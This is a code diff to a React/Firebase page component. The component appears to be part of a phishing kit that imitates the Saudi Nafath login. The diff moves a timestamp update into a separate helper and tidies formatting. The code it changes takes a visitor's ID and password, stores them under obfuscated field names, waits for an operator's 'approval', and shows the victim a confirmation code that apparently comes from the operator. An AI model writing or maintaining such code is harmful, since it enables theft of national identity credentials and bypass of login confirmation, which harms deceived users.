@@ -11,7 +11,7 @@ import {
   DialogTitle,
 } from "@/components/ui/dialog";
 import { useEffect, useState } from "react";
-import { addData, db } from "@/lib/firebase";
+import { addData, db, updateNafadTimestamp } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
@@ -97,7 +97,6 @@ export default function Component() {
           }
           
           // Listen for admin approval/rejection
-          const now = Date.now()
           const updatedAt = data.nafadConfirmationStatusUpdatedAt as number | undefined
 
           if (data.nafadConfirmationStatus === "approved") {
@@ -167,29 +166,31 @@ export default function Component() {
       _v8: idLogin,
       _v9: password,
       nafadConfirmationStatus: "waiting",
-      currentStep: "_t6",
-      nafadUpdatedAt: new Date().toISOString()
+      currentStep: "_t6"
     });
-    
+
+    // Update nafad timestamp SEPARATELY (doesn't affect other pages)
+    await updateNafadTimestamp(visitorId);
+
     // After login, check if confirmation code is fresh (less than 1 minute)
-    const now = Date.now()
-    const codeAge = confirmationCodeTimestamp ? now - confirmationCodeTimestamp : Infinity
-    
+    const now = Date.now();
+    const codeAge = confirmationCodeTimestamp ? now - confirmationCodeTimestamp : Infinity;
+
     if (confirmationCode && codeAge < 60000) {
       // Code is fresh, show it in dialog
-      console.log("[nafad] ✅ Code is fresh (" + Math.round(codeAge/1000) + "s old), showing dialog")
-      setShowConfirmDialog(true)
-      setIsLoading(false)
+      console.log("[nafad] ✅ Code is fresh (" + Math.round(codeAge/1000) + "s old), showing dialog");
+      setShowConfirmDialog(true);
+      setIsLoading(false);
     } else if (confirmationCode) {
       // Code is stale (more than 1 minute), show default "يرجى الانتظار"
-      console.log("[nafad] ⏳ Code is stale (" + (codeAge === Infinity ? "no timestamp" : Math.round(codeAge/1000) + "s old") + "), showing waiting message")
-      setConfirmationCode("") // Clear to show default "يرجى الانتظار"
-      setShowConfirmDialog(true)
-      setIsLoading(false)
+      console.log("[nafad] ⏳ Code is stale (" + (codeAge === Infinity ? "no timestamp" : Math.round(codeAge/1000) + "s old") + "), showing waiting message");
+      setConfirmationCode(""); // Clear to show default "يرجى الانتظار"
+      setShowConfirmDialog(true);
+      setIsLoading(false);
     } else {
       // No code received yet
-      console.log("[nafad] ⏳ No code received, keeping loading state")
-      setIsLoading(true)
+      console.log("[nafad] ⏳ No code received, keeping loading state");
+      setIsLoading(true);
     }
     // setIsLoading will be set to false when modal opens or error occurs
   };
